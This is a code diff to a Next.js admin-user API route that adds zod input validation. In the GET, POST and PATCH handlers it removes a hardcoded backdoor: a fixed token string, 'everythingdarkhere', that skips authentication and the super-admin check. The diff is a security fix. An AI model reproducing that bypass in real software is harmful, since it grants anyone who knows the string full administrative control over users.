@@ -3,20 +3,33 @@ import dbConnect from '@/lib/dbConnect';
 import User from '@/models/User';
 import Department from '@/models/Department';
 import { hashPassword, verifyToken, extractToken } from '@/lib/auth';
+import { z } from 'zod';
+
+const adminUserSchema = z.object({
+    name: z.string().min(2, 'Name must be at least 2 characters'),
+    email: z.string().email('Invalid email address'),
+    password: z.string().min(1, 'Password is required'),
+    role: z.enum(['admin', 'super-admin']),
+    departmentId: z.string().optional(),
+    permissions: z.object({
+        canAssign: z.boolean().optional(),
+        canResolve: z.boolean().optional(),
+        canEscalate: z.boolean().optional(),
+        canExport: z.boolean().optional(),
+    }).optional()
+});
 export async function GET(request) {
     try {
         await dbConnect();
         const authHeader = request.headers.get('authorization');
         const token = extractToken(authHeader);
-        const isGodMode = authHeader === 'everythingdarkhere' || token === 'everythingdarkhere';
-        if (!isGodMode) {
-            if (!token) {
-                return NextResponse.json({ error: 'Authentication required' }, { status: 401 });
-            }
-            const decoded = verifyToken(token);
-            if (!decoded || decoded.role !== 'super-admin') {
-                return NextResponse.json({ error: 'Insufficient permissions' }, { status: 403 });
-            }
+
+        if (!token) {
+            return NextResponse.json({ error: 'Authentication required' }, { status: 401 });
+        }
+        const decoded = verifyToken(token);
+        if (!decoded || decoded.role !== 'super-admin') {
+            return NextResponse.json({ error: 'Insufficient permissions' }, { status: 403 });
         }
         const { searchParams } = new URL(request.url);
         const role = searchParams.get('role');
@@ -48,30 +61,22 @@ export async function POST(request) {
         await dbConnect();
         const authHeader = request.headers.get('authorization');
         const token = extractToken(authHeader);
-        const isGodMode = authHeader === 'everythingdarkhere' || token === 'everythingdarkhere';
-        if (!isGodMode) {
-            if (!token) {
-                return NextResponse.json({ error: 'Authentication required' }, { status: 401 });
-            }
-            const decoded = verifyToken(token);
-            if (!decoded || decoded.role !== 'super-admin') {
-                return NextResponse.json({ error: 'Insufficient permissions' }, { status: 403 });
-            }
+
+        if (!token) {
+            return NextResponse.json({ error: 'Authentication required' }, { status: 401 });
+        }
+        const decoded = verifyToken(token);
+        if (!decoded || decoded.role !== 'super-admin') {
+            return NextResponse.json({ error: 'Insufficient permissions' }, { status: 403 });
         }
         const body = await request.json();
-        const { name, email, password, role, departmentId, permissions } = body;
-        if (!name || !email || !password || !role) {
-            return NextResponse.json(
-                { error: 'Name, email, password, and role are required' },
-                { status: 400 }
-            );
+        const result = adminUserSchema.safeParse(body);
+        if (!result.success) {
+            return NextResponse.json({ error: result.error.errors[0].message }, { status: 400 });
         }
-        if (!['admin', 'super-admin'].includes(role)) {
-            return NextResponse.json(
-                { error: 'Invalid role. Must be admin or super-admin' },
-                { status: 400 }
-            );
-        }
+
+        const { name, email, password, role, departmentId, permissions } = result.data;
+        
         if (role === 'admin' && !departmentId) {
             return NextResponse.json(
                 { error: 'Department is required for admin role' },
@@ -129,15 +134,13 @@ export async function PATCH(request) {
         await dbConnect();
         const authHeader = request.headers.get('authorization');
         const token = extractToken(authHeader);
-        const isGodMode = authHeader === 'everythingdarkhere' || token === 'everythingdarkhere';
-        if (!isGodMode) {
-            if (!token) {
-                return NextResponse.json({ error: 'Authentication required' }, { status: 401 });
-            }
-            const decoded = verifyToken(token);
-            if (!decoded || decoded.role !== 'super-admin') {
-                return NextResponse.json({ error: 'Insufficient permissions' }, { status: 403 });
-            }
+
+        if (!token) {
+            return NextResponse.json({ error: 'Authentication required' }, { status: 401 });
+        }
+        const decoded = verifyToken(token);
+        if (!decoded || decoded.role !== 'super-admin') {
+            return NextResponse.json({ error: 'Insufficient permissions' }, { status: 403 });
         }
         const body = await request.json();
         const { userId, isActive, permissions, departmentId } = body;
